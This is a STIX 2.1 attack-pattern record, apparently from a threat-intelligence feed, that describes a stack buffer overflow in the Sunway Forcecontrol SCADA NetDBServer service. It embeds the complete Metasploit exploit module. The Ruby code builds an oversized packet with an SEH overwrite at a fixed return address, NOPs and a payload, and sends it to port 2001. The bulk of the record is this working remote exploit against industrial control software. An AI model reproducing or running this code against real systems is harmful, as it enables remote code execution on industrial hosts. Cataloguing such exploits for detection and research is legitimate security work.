{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3078ea5f-6957-4c65-972b-a80c7eac90d5",
    "created": "2024-08-14T16:39:13.92458Z",
    "modified": "2024-08-14T16:39:13.924583Z",
    "name": "Sunway Forcecontrol SNMP NetDBServer.exe Opcode 0x57",
    "description": " This module exploits a stack based buffer overflow found in the SNMP NetDBServer service of Sunway Forcecontrol <= 6.1 sp3. The overflow is triggered when sending an overly long string to the listening service on port 2001. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/sunway_force_control_netdbsrv.rb",
            "external_id": "sunway_force_control_netdbsrv.rb"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.altervista.org/adv/forcecontrol_1-adv.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Sunway Forcecontrol SNMP NetDBServer.exe Opcode 0x57',\n      'Description'    => %q{\n          This module exploits a stack based buffer overflow found in the SNMP\n        NetDBServer service of Sunway Forcecontrol <= 6.1 sp3. The overflow is\n        triggered when sending an overly long string to the listening service\n        on port 2001.\n      },\n      'Author'         => [\n            'Luigi Auriemma', # original discovery\n            'Rinat Ziyayev',\n            'James Fitts <fitts.james[at]gmail.com>'\n          ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '75798'],\n          [ 'BID', '49747' ],\n          [ 'URL', 'http://aluigi.altervista.org/adv/forcecontrol_1-adv.txt' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'DisableNops' => 'true',\n          'BadChars' => \"\\x0a\\x0d\\xae\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            # p/p/r ComDll.dll\n            'Windows', {  'Ret' => 0x100022c4 }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2011-09-22'))\n\n    register_options(\n      [\n        Opt::RPORT(2001)\n      ])\n  end\n\n  def exploit\n    connect\n\n    header =  \"\\xeb\\x50\\xeb\\x50\"\n    header << \"\\x57\\x00\"  # packet type\n    header << \"\\xff\\xff\\x00\\x00\"\n    header << \"\\x01\\x00\"\n    header << \"\\xff\"\n\n    footer = \"\\r\\n\"\n\n    packet = rand_text_alpha_upper(65535)\n    packet[0,header.length] = header\n    packet[293,8] = generate_seh_record(target.ret)\n    packet[301,20] = make_nops(20)\n    packet[321,payload.encoded.length] = payload.encoded\n    packet[65533,2] = footer\n\n    print_status(\"Trying target %s...\" % target.name)\n\n    sock.put(packet)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-09-22",
    "x_mitre_platforms": [
        "win'"
    ]
}